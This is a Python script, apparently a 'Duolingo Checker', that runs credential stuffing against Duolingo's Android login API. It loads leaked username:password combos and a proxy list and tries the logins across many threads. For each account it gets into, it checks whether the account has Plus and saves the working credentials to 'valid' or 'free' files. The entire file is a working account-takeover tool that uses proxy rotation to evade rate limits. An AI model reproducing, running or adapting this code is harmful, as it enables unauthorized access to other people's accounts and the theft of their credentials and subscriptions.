from colorama import Fore, Style
import threading, requests, ctypes, os, json, time
import gratient
from datetime import datetime
os.system("cls"); ctypes.windll.kernel32.SetConsoleTitleW(f"Duolingo Checker") 

lock = threading.Lock()
proxies = []
combos = []
proxy_counter = 0
counter = 0

w = Fore.WHITE
l = Fore.LIGHTBLUE_EX
rs = Style.RESET_ALL

date = datetime.now() 
today = date.today() 
today = str(today).split(".")[0] 
today = today.replace(":","-") 

class DUO:
    def __init__(self):
        self.session = requests.Session()
        self.Ratelimits = 0
        self.Valids = 0
        self.Bad = 0
        self.Checked = 0
        self.Errors = 0
        self.Retries = 0
        self.Free = 0

    def safeprint(self, arg):
        lock.acquire()
        print(arg)
        lock.release()

    def loadproxies(self): 
        if os.path.exists("proxies.txt"):
            with open ("proxies.txt","r",encoding="UTF-8") as f:
                for line in f.readlines():
                    line = line.replace("\n", "")
                    proxies.append(line)
                if len(proxies) == 0:
                    print(Fore.RED + f"\a\n\t\t{l}[!] {w}Proxies file is empty, please put in proxies.")
                    input(Fore.BLACK + "\t\t" + Fore.BLACK); quit()
        else:
            print(Fore.RED + f"\a\n\t\t{l}[!] {w}Make proxies.txt and put proxies in proxies.txt")
            input(Fore.BLACK + "\t\t" + Fore.BLACK); quit()

    def loadcumbers(self): 
        if os.path.exists("combo.txt"):
            with open ("combo.txt","r",encoding="UTF-8") as f:
                for line in f.readlines():
                    line = line.replace("\n", "")
                    combos.append(line)
                if len(combos) == 0:
                    print(Fore.RED + f"\a\n\t\t{l}[!] {w}Combo file is empty, please put in lines.")
                    input(); quit()
        else:
            print(Fore.RED + f"\a\n\t\t{l}[!] {w}Make Combo.txt and put lines in combo.txt")
            input(), quit()

    def Threads(self):
        try:
            threads = int(input(f'\n\t\t{w}> {l}Threads: {rs}'))
            os.system('cls')
            gratient_text = gratient.blue(ape)
            print(gratient_text)
            return threads
        except ValueError:
            self.Threads()    

    def gettoken(self): 
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
        }
        url = "https://www.duolingo.com/"
        r = self.session.get(url,headers=headers).cookies
        for cookie in r:
            if cookie.name == "logged_out_uuid":
                id  = cookie.value
                return id

    def title(self): 
        ctypes.windll.kernel32.SetConsoleTitleW(f"Duolingo Checker - Checked: {self.Checked} | Plus Hits: {self.Valids} | Free Hits: {self.Free} | Bad: {self.Bad} | Retries: {self.Retries}")


    def login(self,proxy,today,combo): 
        self.title()
        try:
            token = self.gettoken() 
            u = combo.split(":")[0]
            p = combo.split(":")[1]
            proxiess = { 
            "http": f"http://{proxy}", 
            "https": f"http://{proxy}", 
            "ftp": f"ftp://{proxy}"}
            headers = { 
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://android-api-cf.duolingo.com/?isLoggingIn=true",
                "Content-Type": "application/json;charset=UTF-8"
            }
            getheaders = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                "Pragma": "no-cache",
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            data = { 
                "distinctId": token,
                "identifier": u,
                "password": p,
            }
            try:
                r = self.session.post('https://android-api-cf.duolingo.com/2017-06-30/login?fields=id',headers=headers,data=json.dumps(data),proxies=proxiess)
            except:
                self.login(proxy,today,combo)
            if '{"id":' in r.text: 
                id = r.text.split('{"id":')[1].split('}')[0]
                try:
                    s = self.session.get(f'https://android-api-cf.duolingo.com/2017-06-30/users/{id}?fields=adsConfig%7Bunits%7D%2Cid%2CautoUpdatePreloadedCourses%2CbetaStatus%2Cbio%2CblockerUserIds%2CblockedUserIds%2CcoachOutfit%2Ccourses%7BauthorId%2CfromLanguage%2Cid%2ChealthEnabled%2ClearningLanguage%2Cpreload%2Ctitle%2Cxp%2Ccrowns%7D%2CcreationDate%2CcurrentCourseId%2Cemail%2CemailAnnouncement%2CemailFollow%2CemailPass%2CemailPromotion%2CemailStreakFreezeUsed%2CemailWeeklyProgressReport%2CemailWordOfTheDay%2Cexperiments%7Bandroid_alphabets_ar_en_internal%2Candroid_alphabets_ko_en%2Candroid_home_loading_animation_v2%2Candroid_idle_animations_v2%2Candroid_keep_resources_until_memory_low%2Candroid_show_character_measurement_v2%2Cchina_android_speaking_challenge_v3%2Cchina_android_turn_on_plus_v1%2Cconnect_android_exit_enlarged_avatar%2Cconnect_android_kudos_feed_v1%2Cconnect_android_lb_reactions_se_screen%2Cconnect_android_remove_follow_counts_v1%2Ccourses_fr_ja_v1%2Ccourses_it_de_v1%2Chacker_android_redesign_select%2Chacker_android_remove_volume_prompt%2Clearning_android_show_tap_toggle_v2%2Clearning_c_android_level_review_v4%2Cmercury_android_acqui_survey_title%2Cmidas_android_ads_remove_rv_skippers%2Cmidas_android_ads_shop_rewarded%2Cmidas_android_animate_fab_show_1%2Cmidas_android_autorenewal_scroll%2Cmidas_android_carousel_cta_v2%2Cmidas_android_custom_quit_v5%2Cmidas_android_immersive_hearts_logic_v3%2Cmidas_android_plus_checklist%2Cmidas_android_plus_checklist_register%2Cmidas_android_pronunciation_review%2Cmidas_android_remove_plus_fab%2Cmidas_android_timeline_purchase_page%2Cnurr_android_delay_ads_sdk_n_lessons%2Cnurr_android_mid_session_refill_copy%2Cnurr_android_new_welcome_copy_button%2Cnurr_android_no_dark_mode_dark%2Cnurr_android_no_dark_mode_light%2Cnurr_android_no_home_message_onboarding%2Cnurr_android_no_soft_wall_basics_1%2Cnurr_android_no_soft_wall_placement%2Cnurr_android_onboarding_home_messages%2Cnurr_android_placement_in_lesson_streak%2Cnurr_android_uo_suppress_red_dot%2Cnurr_android_user_tuned_placement%2Copmar_android_force_add_phone_number%2Copmar_android_grading_ribbon_v3%2Copmar_android_home_shop_icon_redesign%2Cposeidon_android_axe_levelup_gems_bonus%2Cposeidon_android_port_ramp_up_challenge%2Cretention_android_SE_anim_delay%2Cretention_android_cal_count%2Cretention_android_day_1_freeze_v1%2Cretention_android_deeplink_intro_v2%2Cretention_android_lost_streak_notif%2Cretention_android_multiple_streak_free%2Cretention_android_new_se_anim_v1%2Cretention_android_restreak_titles_v1%2Cretention_android_se_streak_stats%2Cretention_android_short_st_drawer_v2%2Cretention_android_stories_redirect_cta%2Cretention_android_streak_units_v2%2Cretention_android_surr_lesson_onbd%2Cretention_android_words_learned_duo%2Csigma_android_cancel_survey%2Csigma_android_decayed_skill_progress%2Csigma_android_manual_purchase_restore%2Csigma_android_remove_offline_free_users%2Csigma_android_winback_limited_time_1%2Cstories_android_en_from_hi%2Cstories_android_en_from_ko%2Ctsl_android_daily_goal_trigger%2Ctsl_android_lb_se_bottom_five%2Ctsl_android_lb_se_lowend%2Ctsl_android_leagues_stats_v1%2Ctsl_android_next_lesson_v2%2Ctsl_android_next_skill_slideup%2Ctsl_haptic_feedback_v3%2Cwriting_android_furigana%2Cwriting_romaji_off_default%7D%2CfacebookId%2CfeedbackProperties%2CfromLanguage%2CgemsConfig%7Bgems%2CgemsPerSkill%2CuseGems%7D%2CglobalAmbassadorStatus%7Blevel%2Ctypes%7D%2CgoogleId%2ChasFacebookId%2ChasGoogleId%2ChasPlus%2ChasRecentActivity15%2Chealth%7BeligibleForFreeRefill%2ChealthEnabled%2CuseHealth%2Chearts%2CmaxHearts%2CsecondsPerHeartSegment%2CsecondsUntilNextHeartSegment%2CnextHeartEpochTimeMs%7D%2CinviteURL%2CjoinedClassroomIds%2ClearningLanguage%2Clingots%2Clocation%2Cname%2CobservedClassroomIds%2CoptionalFeatures%7Bid%2Cstatus%7D%2CpersistentNotifications%2CphoneNumber%2Cpicture%2CplusDiscounts%7BexpirationEpochTime%2CdiscountType%2CsecondsUntilExpiration%7D%2CpracticeReminderSettings%2CprivacySettings%2CpushAnnouncement%2CpushFollow%2CpushLeaderboards%2CpushPassed%2CpushPromotion%2CpushStreakFreezeUsed%2CpushStreakSaver%2CreferralInfo%7BhasReachedCap%2CnumBonusesReady%2CunconsumedInviteeIds%2CunconsumedInviteeName%2CinviterName%2CisEligibleForBonus%2CisEligibleForOffer%7D%2CrequiresParentalConsent%2CrewardBundles%7Bid%2CrewardBundleType%2Crewards%7Bid%2Cconsumed%2CitemId%2Ccurrency%2Camount%7D%7D%2Croles%2CshakeToReportEnabled%2CstateNeedsTOS%2CshopItems%7Bid%2CpurchaseDate%2CpurchasePrice%2Cquantity%2CsubscriptionInfo%7Bcurrency%2CexpectedExpiration%2CisFreeTrialPeriod%2CperiodLength%2Cprice%2Crenewer%2Crenewing%7D%2CwagerDay%2CexpectedExpirationDate%2CpurchaseId%2CremainingEffectDurationInSeconds%2CexpirationEpochTime%2CfamilyPlanInfo%7BownerId%2CsecondaryMembers%2CinviteToken%7D%7D%2Cstreak%2CstreakData%7Blength%2CstartTimestamp%2CupdatedTimestamp%2CupdatedTimeZone%2CxpGoal%7D%2CsubscriptionConfigs%7BisInBillingRetryPeriod%2CvendorPurchaseId%2CproductId%2CpauseStart%2CpauseEnd%7D%2Ctimezone%2CtotalXp%2CtrackingProperties%2Cusername%2CxpGains%7Btime%2Cxp%2CeventType%2CskillId%7D%2CxpConfig%7BmaxSkillTestXp%2CmaxCheckpointTestXp%2CmaxPlacementTestXp%7D%2CxpGoal%2CzhTw%2CtimerBoostConfig%7BtimerBoosts%2CtimePerBoost%2ChasFreeTimerBoost%7D',headers=getheaders,proxies=proxiess)
                except:
                    self.login(proxy,today,combo)
                json_resp = s.json()
                if json_resp["hasPlus"] == True: 
                    courseid = s.json()["currentCourseId"] 
                    finalcourseid = str(courseid).split("DUOLINGO_")[1]
                    with open(f"valid {today}.txt", "a") as f: 
                        f.write(f"{u}:{p} | Has plus: True | Current course: {finalcourseid}\n") 
                        self.Valids += 1
                        self.Checked += 1
                if json_resp["hasPlus"] == False: 
                    with open(f"free {today}.txt", "a") as f: 
                        f.write(f"{u}:{p} | Has plus: False\n")
                        self.Free += 1
                        self.Checked += 1
            elif '{}' in r.text:
                self.Bad += 1
                self.Checked += 1
            self.title()
        except Exception as e: 
            self.Retries += 1
            self.title()
            pass

def duolingo():
    global DUO
    global counter
    global proxy_counter
    DUO.loadcumbers()
    DUO.loadproxies()
    threads = DUO.Threads()
    
    def thread_starter():
        DUO.login(proxies[proxy_counter], today, combos[counter])    

    while True:
        try:
            if threading.active_count() <= threads:
                threading.Thread(target = thread_starter).start()
                proxy_counter += 1
                counter += 1
            if len(proxies) <= proxy_counter:
                proxy_counter = 0
            if len(combos) <= counter:
                break
        except Exception as e:
            pass

ape = ("""
\t\t██████╗ ██╗   ██╗ ██████╗ ██╗     ██╗███╗   ██╗ ██████╗  ██████╗ 
\t\t██╔══██╗██║   ██║██╔═══██╗██║     ██║████╗  ██║██╔════╝ ██╔═══██╗
\t\t██║  ██║██║   ██║██║   ██║██║     ██║██╔██╗ ██║██║  ███╗██║   ██║
\t\t██║  ██║██║   ██║██║   ██║██║     ██║██║╚██╗██║██║   ██║██║   ██║
\t\t██████╔╝╚██████╔╝╚██████╔╝███████╗██║██║ ╚████║╚██████╔╝╚██████╔╝
\t\t╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝
\t\t\t\t ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
\t\t\t\t██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
\t\t\t\t██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
\t\t\t\t██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
\t\t\t\t╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
\t\t\t\t ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                        
""")   

DUO = DUO()
gratient_text = gratient.blue(ape)
print(gratient_text)
duolingo()
DUO.safeprint(f"{w}\n\n\t\tFinished")
input()
